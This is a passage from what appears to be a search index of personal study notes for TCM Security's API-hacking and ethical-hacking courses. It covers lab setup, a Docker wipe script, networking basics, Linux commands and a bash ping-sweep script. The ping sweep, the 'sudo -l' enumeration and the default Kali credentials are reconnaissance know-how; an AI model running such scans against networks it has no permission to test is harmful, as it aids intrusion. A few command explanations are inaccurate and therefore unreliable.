Forgery","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#chaining-vulnerabilities","title":"Chaining Vulnerabilities","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#final-capstone","title":"Final Capstone","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#resources","title":"Resources","text":"<p>exploit-notes.hdks</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#the-labs","title":"The Labs","text":"<p>Excessive Data Exposure</p> <p>Excessive Data Exposure Lab https://academy.tcm-sec.com/courses/2008721/lectures/45990731</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#bfla-lab","title":"BFLA Lab","text":"<p>BFLA Lab</p> <p>To get the vAPI application</p> <pre><code>git clone https://github.com/roottusk/vapi\n#The collection is in the \"postman\" folder\n#If you don't have git, you can use:\nsudo apt install git\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#bfla-lab_1","title":"BFLA Lab","text":"<p>BFLA Lab</p> <p>To get the vAPI application</p> <pre><code>git clone https://github.com/roottusk/vapi\n#The collection is in the \"postman\" folder\n#If you don't have git, you can use:\nsudo apt install git\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#sql-injection-lab","title":"SQL Injection Lab","text":"<p>SQL Injection Lab api-injection.zip</p> <p>Cleaning up your old containers</p> <pre><code>#!/bin/bash\nsudo docker stop $(sudo docker ps -aq)\nsudo docker rm $(sudo docker ps -aq)\nsudo docker rmi $(sudo docker images -q)\nsudo docker volume rm $(sudo docker volume ls -q)\nsudo docker network rm $(sudo docker network ls -q)\n</code></pre> <p>Lab troubleshooting</p> <p>If you get a general error with one of the labs, e.g. some functionality isn't working try:</p> <p>Restarting the lab Rebuilding the lab <code>sudo docker-compose up --build</code> Running the above cleanup script and then rebuilding the lab</p> <p>If you're not sure what port the lab is running on</p> <p>Check the <code>docker-compose.yml</code> file. You will see a line similar to \"9000:80\" so in this case, the lab will be running on <code>http://localhost:9000</code></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#sql-injection-lab_1","title":"SQL Injection Lab","text":"<p>SQL Injection Lab - Login Bypass</p> <p>Cleaning up your old containers</p> <pre><code>#!/bin/bash\nsudo docker stop $(sudo docker ps -aq)\nsudo docker rm $(sudo docker ps -aq)\nsudo docker rmi $(sudo docker images -q)\nsudo docker volume rm $(sudo docker volume ls -q)\nsudo docker network rm $(sudo docker network ls -q)\n</code></pre> <p>Lab troubleshooting</p> <p>If you get a general error with one of the labs, e.g. some functionality isn't working try:</p> <p>Restarting the lab Rebuilding the lab <code>sudo docker-compose up --build</code> Running the above cleanup script and then rebuilding the lab</p> <p>If you're not sure what port the lab is running on</p> <p>Check the <code>docker-compose.yml</code> file. You will see a line similar to \"9000:80\" so in this case, the lab will be running on <code>http://localhost:9000</code></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#nosql-injection-lab","title":"NoSQL Injection Lab","text":"<p>NoSQL Injection Lab api-nosql-injection.zip</p> <p>Cleaning up your old containers</p> <pre><code>#!/bin/bash\nsudo docker stop $(sudo docker ps -aq)\nsudo docker rm $(sudo docker ps -aq)\nsudo docker rmi $(sudo docker images -q)\nsudo docker volume rm $(sudo docker volume ls -q)\nsudo docker network rm $(sudo docker network ls -q)\n</code></pre> <p>Lab troubleshooting</p> <p>If you get a general error with one of the labs, e.g. some functionality isn't working try:</p> <p>Restarting the lab Rebuilding the lab <code>sudo docker-compose up --build</code> Running the above cleanup script and then rebuilding the lab If you're not sure what port the lab is running on</p> <p>Check the <code>docker-compose.yml</code> file. You will see a line similar to \"9000:80\" so in this case, the lab will be running on <code>http://localhost:9000</code></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_API_Hacking/#mass-assignment-lab","title":"Mass Assignment Lab","text":"<p>Mass Assignment Lab api-mass-assignment.zip</p> <p>Cleaning up your old containers</p> <pre><code>#!/bin/bash\nsudo docker stop $(sudo docker ps -aq)\nsudo docker rm $(sudo docker ps -aq)\nsudo docker rmi $(sudo docker images -q)\nsudo docker volume rm $(sudo docker volume ls -q)\nsudo docker network rm $(sudo docker network ls -q)\n</code></pre> <p>Lab troubleshooting</p> <p>If you get a general error with one of the labs, e.g. some functionality isn't working try:</p> <p>Restarting the lab Rebuilding the lab <code>sudo docker-compose up --build</code> Running the above cleanup script and then rebuilding the lab If you're not sure what port the lab is running on:</p> <p>Check the <code>docker-compose.yml</code> file. You will see a line similar to \"9000:80\" so in this case, the lab will be running on <code>http://localhost:9000</code></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/","title":"Practical Ethical Hacking   The Complete Course","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#networking-refresher","title":"Networking Refresher","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#ip-addresses","title":"IP Addresses","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#mac-addresses","title":"MAC Addresses","text":"<p>OUI Lookup</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#tcp-udp-and-the-three-way-handshake","title":"TCP, UDP, and the Three-Way Handshake","text":"<p>TCP (Transmission Control Protocol) and UDP (User Datagram Protocol)</p> <p>TCP Handshake:</p> <ul> <li>SYN (Synchronize): The initiating device (often referred to as the client) sends a TCP packet with the SYN flag set to the destination device (often referred to as the server). This packet indicates the desire to establish a connection and includes an initial sequence number.</li> <li>SYN-ACK (Synchronize-Acknowledge): Upon receiving the SYN packet, the destination device responds with a TCP packet that has both the SYN and ACK (acknowledge) flags set. This packet acknowledges the receipt of the initial SYN packet and also includes its own initial sequence number</li> <li>ACK (Acknowledge): Finally, the initiating device acknowledges the SYN-ACK packet by sending an ACK packet back to the destination. This packet confirms the establishment of the connection and typically contains an incremented sequence number.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#common-ports-and-protocols","title":"Common Ports and Protocols","text":"<p>Here are some commonly used ports and the protocols associated with them in computer networking:</p> Protocol Port TCP/UDP FTP (File Transfer Protocol) 21 TCP SSH (Secure Shell) 22 TCP Telnet 23 TCP SMTP (Simple Mail Transfer Protocol) 25 TCP DNS (Domain Name System) 53 TCP &amp; UDP HTTP (Hypertext Transfer Protocol) 80 TCP HTTPS (Hypertext Transfer Protocol Secure) 443 TCP DHCP (Dynamic Host Configuration Protocol) 67 &amp; 68 UDP POP3 (Post Office Protocol version 3) 110 TCP IMAP (Internet Message Access Protocol) 143 TCP SNMP (Simple Network Management Protocol) 161 UDP RDP (Remote Desktop Protocol) 3389 TCP NTP (Network Time Protocol) 123 UDP SMB (Server Message Block) 445 TCP FTPS (FTP over SSL/TLS) 990 TCP TFTP (Trivial File Transfer Protocol) 69 UDP LDAP (Lightweight Directory Access Protocol) 389 TCP &amp; UDP MySQL 3306 TCP RDP (Remote Desktop Protocol) 3389 TCP"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#the-osi-model","title":"The OSI Model","text":"OSI Layer Number OSI Layer Name Description 1 Physical Layer The physical layer is responsible for the transmission and reception of raw unstructured data bits over a physical medium. It defines the electrical, mechanical, and functional characteristics of the physical interface between devices. 2 Data Link Layer The data link layer handles the reliable transmission of data frames between directly connected nodes over a physical link. It provides error detection and correction, flow control, and handles access to the physical medium. Ethernet, Wi-Fi, and PPP (Point-to-Point Protocol) are examples of data link layer protocols. 3 Network Layer The network layer enables the routing of data packets across different networks. It deals with logical addressing and determines the best path for data delivery based on network conditions and routing protocols. The IP (Internet Protocol) is a key network layer protocol. 4 Transport Layer The transport layer ensures the reliable and orderly delivery of data between end systems. It breaks data into smaller segments, manages end-to-end communication, and provides error recovery, flow control, and congestion control. TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) operate at this layer. 5 Session Layer The session layer establishes, manages, and terminates communication sessions between applications. It provides synchronization and dialog control mechanisms to enable seamless communication between devices. This layer also handles session checkpointing and recovery. 6 Presentation Layer The presentation layer is responsible for data representation, encryption, compression, and formatting. It ensures that data sent by the application layer of one system is understandable by the application layer of another system. This layer deals with data syntax and semantics. 7 Application Layer The application layer is the closest layer to the end-user and provides services directly to user applications. It includes protocols for various application-level services such as file transfer, email, web browsing, and remote access. Examples of protocols at this layer include HTTP, SMTP, FTP, and DNS."},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#subnetting","title":"Subnetting","text":"<p>Resources:</p> <ul> <li>Seven Second Subnetting</li> <li>Subnet Guide</li> </ul> <p>Summary:</p> <p>Subnetting is the process of dividing a network into smaller subnetworks called subnets. It allows for more efficient use of IP addresses and facilitates network management and routing. Subnetting is commonly used in IPv4 networks.</p> <p>Subnetting involves borrowing bits from the host portion of an IP address to create a subnet identifier. By doing this, a network can be divided into multiple subnets, each with its own range of IP addresses.</p> <p>CIDR (Classless Inter-Domain Routing) notation is a method used to represent IP addresses and their corresponding subnet masks. It specifies the network prefix length, which indicates the number of bits used for the network portion of the IP address. CIDR notation is expressed by appending a forward slash (/) followed by the prefix length to the IP address.</p> <p>Here's an example to illustrate subnetting and CIDR notation:</p> <p>Consider an IP address: 192.168.0.0/24</p> <p>In this example, the IP address is in the format of \"192.168.0.0\" and the \"/24\" represents the prefix length, indicating that the first 24 bits represent the network portion of the IP address, while the remaining 8 bits represent the host portion.</p> <p>With a /24 prefix length, the subnet mask for this network would be 255.255.255.0. This means that the first three octets are reserved for the network, and the last octet can be used for addressing hosts within the subnet.</p> <p>To subnet this network further, additional bits can be borrowed from the host portion. For instance, if we borrow 2 bits, we can create 4 subnets. The subnet mask would become 255.255.255.192 (in binary: 11111111.11111111.11111111.11000000).</p> <p>The four resulting subnets would be:</p> <p>Subnet 1: 192.168.0.0/26 (network range: 192.168.0.0 - 192.168.0.63) Subnet 2: 192.168.0.64/26 (network range: 192.168.0.64 - 192.168.0.127) Subnet 3: 192.168.0.128/26 (network range: 192.168.0.128 - 192.168.0.191) Subnet 4: 192.168.0.192/26 (network range: 192.168.0.192 - 192.168.0.255) Each subnet can then be assigned to a different segment or used for different purposes within the network.</p> <p>CIDR notation provides a concise way to represent networks and subnets by specifying the prefix length. It allows for flexibility in defining network boundaries and enables efficient address allocation in IP networking.</p> <p></p> <p>Bits</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#setting-up-our-lab","title":"Setting Up Our Lab","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#installing-vmware-virtualbox","title":"Installing VMWare / VirtualBox","text":"<ul> <li>VMware</li> <li>VirtualBox</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#configuring-virtualbox","title":"Configuring VirtualBox","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#installing-kali-linux","title":"Installing Kali Linux","text":"<ul> <li>Download Kali</li> <li>Download 7zip</li> </ul> <p>Kali 2019.4. The credentials of root:toor The credentials, as of 2020.1, are kali:kali</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#introduction-to-linux","title":"Introduction to Linux","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#exploring-kali-linux","title":"Exploring Kali Linux","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#sudo-overview","title":"Sudo Overview","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#navigating-the-file-system","title":"Navigating the File System","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> Command Description Example <code>pwd</code> (Print Working Directory) Displays the current working directory Running pwd in the terminal would show the absolute path of the current directory, such as \"/home/user/documents\". <code>cd</code> (Change Directory) Allows you to change the current working directory Running cd /home/user/documents would change the directory to \"/home/user/documents\". <code>cd ..</code> (Change to Parent Directory) Moves up one level in the directory hierarchy Running cd .. in \"/home/user/documents\" would move to the \"/home/user\" directory. <code>ls</code> (List Directory Contents) Lists the files and directories in the current directory Running ls would display the files and directories in the current directory. <code>ls -la</code> (List Detailed Directory Contents) Lists detailed information about files and directories, including hidden files Running ls -la would display a detailed list of files and directories, including hidden files, in the current directory. <code>mkdir</code> (Make Directory) Creates a new directory Running mkdir new_folder would create a new directory named \"new_folder\" in the current directory. <code>rmdir</code> (Remove Directory) Removes an empty directory Running rmdir empty_folder would remove the directory named \"empty_folder\" if it is empty. <code>man</code> (Manual) Displays the manual pages for a specified command Running man ls would show the manual pages with detailed information about the ls command. <code>echo</code> Displays text or variables as output Running echo \"Hello, world!\" would output \"Hello, world!\" in the terminal. <code>&gt;</code> (Output Redirection) Redirects the output of a command to a file and overwrites the file if it already exists Running echo \"Hello\" &gt; greeting.txt would write the text \"Hello\" to a file named \"greeting.txt\" or overwrite the file if it exists. <code>&gt;&gt;</code> (Append Output) Redirects the output of a command and appends it to a file Running echo \"World!\" &gt;&gt; greeting.txt would append the text \"World!\" to the end of the \"greeting.txt\" file. <code>rm</code> (Remove) Deletes files or directories Running rm file.txt would delete the file named \"file.txt\" from the current directory. <code>mv</code> (Move) Moves or renames files and directories Running mv file.txt new_directory/file_renamed.txt would move the file \"file.txt\" to the \"new_directory\" and rename it as \"file_renamed.txt\". <code>cp</code> (Copy) Copies files and directories Running cp file.txt backup/file_copy.txt would create a copy of \"file.txt\" named \"file_copy.txt\" in the \"backup\" directory. <code>locate</code> Searches for files and directories in a prebuilt database Running locate myfile.txt would search for the file named \"myfile.txt\" in the prebuilt database and display its path if found. <code>updatedb</code> Updates the database used by the locate command to reflect recent changes in the file system Running updatedb would update the database, allowing the locate command to provide up-to-date search results. <code>passwd</code> Allows a user to change their password Running passwd would prompt the user to enter their current password and then set a new password. <p>Remember to exercise caution when using commands like rm as they can permanently delete files. It's always a good practice to double-check before executing such commands.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#users-and-privileges","title":"Users and Privileges","text":"<p>In the ls -la output, the \"rwx\" refers to the permissions associated with a file or directory. The permissions are displayed for three different entities: the owner, the group, and other users. Each entity has three permission categories: read (r), write (w), and execute (x). Here's a breakdown of what each permission category represents:</p> <ul> <li>Read (r): Allows the entity to read or view the contents of a file or the names of files within a directory.</li> <li>Write (w): Enables the entity to modify or write to a file or add, delete, or rename files within a directory.</li> <li>Execute (x): Grants the entity the permission to execute a file or enter a directory. For directories, execute permission is required to access its contents.</li> </ul> <p>In the <code>ls -la</code> output, the permissions are displayed as a series of nine characters. The first character represents the file type (e.g., <code>-</code> for a regular file, <code>d</code> for a directory). The next three characters represent the owner's permissions, followed by the group's permissions, and then the permissions for other users.</p> <p>For example, let's consider an <code>ls -la</code> output line:</p> <p><code>-rwxr-x--- 1 user group 4096 May 10 12:34 myfile.txt</code></p> <p>In this example, the permissions are broken down as follows:</p> part Explanation <code>-rwxr-x---</code> The first character indicates that it is a regular file. The following three characters (rwx) represent the owner's permissions (read, write, and execute). The next three characters (<code>r-x</code>) represent the group's permissions (read and execute). The last three characters (<code>---</code>) represent the permissions for other users (no permissions). <code>1</code> Indicates the number of hard links to the file. <code>user</code> Refers to the owner of the file. <code>group</code> Refers to the group assigned to the file. <code>4096</code> Indicates the file size in bytes. <code>May 10 12:34</code> Specifies the date and time of the last modification. <code>myfile.txt</code> Represents the name of the file. <p>It's worth noting that if a permission is not granted for a particular entity, a hyphen (<code>-</code>) is displayed in its place. Additionally, the output can include additional information such as special permissions, ownership, and timestamps.</p> <p>Here are explanations and examples of the commands mentioned in this video. Please note, Teachable blocks the mention of some of the sensitive paths shown in the video, so we cannot display them in text format here:</p> Command Explanation Example <code>chmod</code> (Change Mode) Changes the permissions of a file or directory. Running <code>chmod +x script.sh</code> would add the execute permission to the file \"script.sh\", allowing it to be executed as a script. <code>adduser</code> Creates a new user account. Running adduser john would create a new user account with the username \"john\" and prompt for additional user information. <code>su</code> (Switch User) Allows a user to switch to another user account. Running su jane would switch to the user account \"jane\" after entering the password for that account. <code>/etc/sudoers</code> Displays the content of the <code>/etc/sudoers</code> file, which contains configuration information for the sudo command. Running <code>/etc/sudoers</code> would display the configuration directives for sudo access and permissions. <code>sudo -l</code> Lists the commands a user is allowed to run with sudo privileges. Running <code>sudo -l</code> would display the commands and permissions available to the current user with sudo access. <p>Please note that some of these commands require administrative privileges, and caution should be exercised when modifying system files or working with user accounts.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#common-network-commands","title":"Common Network Commands","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> Command Explanation Example <code>ip a</code> Displays the network interfaces and their associated IP addresses. Running ip a would show information about network interfaces, including their IP addresses, MAC addresses, and other details. <code>ifconfig</code> Displays the configuration and status of network interfaces. Running ifconfig would show the configuration details, including IP addresses, MAC addresses, and other information for active network interfaces. <code>iwconfig</code> Displays the configuration and status of wireless network interfaces. Running iwconfig would show the configuration details, such as wireless signal strength, frequency, and encryption information, for active wireless interfaces. <code>ip n</code> Displays the Neighbor Table, which contains the IP-to-MAC address mappings for devices in the local network. Running ip n would show the IP and MAC addresses of devices that have recently communicated with the current device. <code>arp -a</code> Displays the ARP (Address Resolution Protocol) cache, which maps IP addresses to MAC addresses. Running arp -a would show the IP and MAC addresses of devices that have been resolved recently by the ARP protocol. <code>ip r</code> Displays the routing table, which contains information about network routes. Running ip r would show the routing table, including destination networks, gateway IP addresses, and network interfaces. <code>route</code> Displays or manipulates the IP routing table. Running route would display the routing table, similar to the ip r command. <code>ping</code> Sends ICMP echo requests to a specified IP address to check network connectivity and measure round-trip time. Running ping 8.8.8.8 would send ICMP echo requests to the IP address \"8.8.8.8\" (Google's DNS server) and display the round-trip time and packet loss statistics. <p>These commands are commonly used for network troubleshooting, configuration, and gathering network-related information in Linux systems.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#viewing-creating-and-editing-files","title":"Viewing, Creating, and Editing Files","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> Command Explanation Example <code>echo \"hello\" &gt; hey.txt</code> Creates a new file named \"hey.txt\" with the content \"hello\" and overwrites the file if it already exists. Running <code>echo \"hello\" &gt; hey.txt</code> would create a file named \"hey.txt\" and write the word \"hello\" into it. - - - <code>echo \"hello again\" &gt;&gt; hey.txt</code> Appends the content \"hello again\" to an existing file named \"hey.txt\" or creates a new file if it doesn't exist. Running <code>echo \"hello again\" &gt;&gt; hey.txt</code> would append the text \"hello again\" to the end of the \"hey.txt\" file. <code>touch newfile.txt</code> Creates a new empty file named \"newfile.txt\" or updates the timestamp of an existing file to the current time. Running <code>touch newfile.txt</code> would create an empty file named \"newfile.txt\" if it doesn't exist or update its timestamp if it already exists. <code>nano newfile.txt</code> Opens the text editor Nano and allows you to create or edit the content of a file named \"newfile.txt\". Running <code>nano newfile.txt</code> would open the Nano editor, where you can enter or modify text in the \"newfile.txt\" file. <code>mousepad newfile.txt</code> Opens the Mousepad text editor and allows you to create or edit the content of a file named \"newfile.txt\". Running <code>mousepad newfile.txt</code> would open the Mousepad editor, where you can enter or modify text in the \"newfile.txt\" file. <p>These commands are commonly used for file manipulation and editing in Linux systems. The echo command is used to print text or variables to the terminal or redirect them to files. The touch command is used to create or update file timestamps. The nano and mousepad commands are text editors that allow you to create and modify files directly from the terminal.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#starting-and-stopping-services","title":"Starting and Stopping Services","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> Command Explanation Example <code>sudo service apache2 start</code> Starts the Apache web server service. Running <code>sudo service apache2 start</code> would initiate the Apache web server and make it available for serving web pages. <code>sudo service apache2 stop</code> Stops the Apache web server service. Running <code>sudo service apache2 stop</code> would halt the running Apache web server, shutting down any active web page serving. <code>python3 -m http.server 80</code> Starts a simple HTTP server using Python on port 80. Running <code>python3 -m http.server 80</code> would start a basic HTTP server on port 80, allowing you to serve files from the current directory. <code>sudo systemctl enable ssh</code> Enables the SSH (Secure Shell) service to start automatically on system boot. Running <code>sudo systemctl enable ssh</code> would configure the system to start the SSH service during system startup. <code>sudo systemctl disable ssh</code> Disables the SSH service from starting automatically on system boot. Running <code>sudo systemctl disable ssh</code> would prevent the SSH service from starting automatically during system startup. <p>These commands are frequently used in Linux systems for managing services, starting and stopping processes, and enabling or disabling specific services at system startup. The sudo command is used to execute commands with superuser privileges. The service and systemctl commands are used to manage system services.|</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#installing-and-updating-tools","title":"Installing and Updating Tools","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> Command Explanation Example <code>sudo apt update &amp;&amp; sudo apt upgrade</code> Updates the package lists and upgrades installed packages on a Debian-based Linux system using the APT package manager. Running <code>sudo apt update &amp;&amp; sudo apt upgrade</code> would update the package lists to retrieve information about available updates, and then upgrade the installed packages to their latest versions <code>sudo apt install cron-daemon-common</code> Installs the \"cron-daemon-common\" package using APT. Cron is a time-based job scheduler in Linux systems, and the \"cron-daemon-common\" package provides common files and utilities for the cron daemon. Running <code>sudo apt install cron-daemon-common</code> would download and install the \"cron-daemon-common\" package on the system <code>sudo git clone https://github.com/Dewalt-arch/pimpmykali.git</code> Clones a Git repository from the specified URL using the Git version control system. Running <code>sudo git clone https://github.com/Dewalt-arch/pimpmykali.git</code> would clone the repository from the given URL and create a local copy of the repository's files and version history <p>These commands are commonly used in Linux systems for updating packages, installing new software, and managing version-controlled repositories. The sudo command is used to execute commands with superuser privileges. The apt command is used for package management in Debian-based distributions. The git command is used for version control and working with Git repositories.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#scripting-with-bash","title":"Scripting with Bash","text":"<pre><code>#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"You forgot an IP address!\"\necho \"Syntax: ./ipsweep.sh 192.168.1\"\n\nelse\nfor ip in `seq 1 254`; do\nping -c 1 $1.$ip | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" &amp;\ndone\nfi\n</code></pre> <p>Question: My bash script is producing an error with \u201cseq\u201d. How do I resolve?</p> <p>Resolution: Ensure use of backtick (`) instead of using single quote ('). Alternatively, use $(seq 1 254) instead of seq</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#introduction-to-python","title":"Introduction to Python","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#introduction","title":"Introduction","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#strings","title":"Strings","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#math","title":"Math","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#variables-and-methods","title":"Variables and Methods","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#functions","title":"Functions","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#boolean-expressions-and-relational-operators","title":"Boolean Expressions and Relational Operators","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#conditional-statements","title":"Conditional Statements","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#lists","title":"Lists","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#tuples","title":"Tuples","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#looping","title":"Looping","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#advanced-strings","title":"Advanced Strings","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#dictionaries","title":"Dictionaries","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#importing-modules","title":"Importing Modules","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#sockets","title":"Sockets","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#building-a-port-scanner","title":"Building a Port Scanner","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#user-input","title":"User Input","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#reading-and-writing-files","title":"Reading and Writing Files","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#classes-and-objects","title":"Classes and Objects","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#building-a-shoe-budget-tool","title":"Building a Shoe Budget Tool","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#the-ethical-hacker-methodology","title":"The Ethical Hacker Methodology","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#the-five-stages-of-ethical-hacking","title":"The Five Stages of Ethical Hacking","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#information-gathering-reconnaissance","title":"Information Gathering (Reconnaissance)","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#passive-reconnaissance-overview","title":"Passive Reconnaissance Overview","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#identifying-our-target","title":"Identifying Our Target","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#discovering-email-addresses","title":"Discovering Email Addresses","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#gathering-breached-credentials-with-breach-parse","title":"Gathering Breached Credentials with Breach-Parse","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#hunting-breached-credentials-with-dehashed","title":"Hunting Breached Credentials with DeHashed","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#hunting-subdomains-part-1","title":"Hunting Subdomains Part 1","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#hunting-subdomains-part-2","title":"Hunting Subdomains Part 2","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#identifying-website-technologies","title":"Identifying Website Technologies","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#information-gathering-with-burp-suite","title":"Information Gathering with Burp Suite","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#google-fu","title":"Google Fu","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#utilizing-social-media","title":"Utilizing Social Media","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#additional-learning-osint-fundamentals","title":"Additional Learning (OSINT Fundamentals)","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#scanning-enumeration","title":"Scanning &amp; Enumeration","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#installing-kioptrix","title":"Installing Kioptrix","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#scanning-with-nmap","title":"Scanning with Nmap","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course/#enumerating-http-and-https-part-1","title":"Enumerating HTTP and HTTPS Part 